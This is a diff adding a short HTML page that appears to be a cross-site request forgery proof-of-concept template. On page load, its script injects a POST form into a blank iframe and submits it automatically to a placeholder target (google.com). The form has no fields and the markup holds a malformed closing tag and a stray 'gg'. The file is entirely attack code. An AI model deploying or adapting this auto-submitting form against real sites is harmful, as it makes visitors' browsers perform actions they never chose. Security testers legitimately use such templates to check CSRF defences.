@@ -1,0 +1,16 @@
+<html>
+    <head>
+    <script>
+    function load() {
+        var postdata = '<form id=csrf method=POST enctype=\'text\/plain\' action=\'https://google.com\'>' +
+                        
+                        '</form>';
+        top.frames[0].document.body.innerHTML=postdata;
+        top.frames[0].document.getElementById('csrf').submit();
+    }
+    </script>
+    </head>
+    <body onload="load()">
+    <iframe src="about:blank" id="noreferer">< /iframe>gg
+</body>
+    </html>
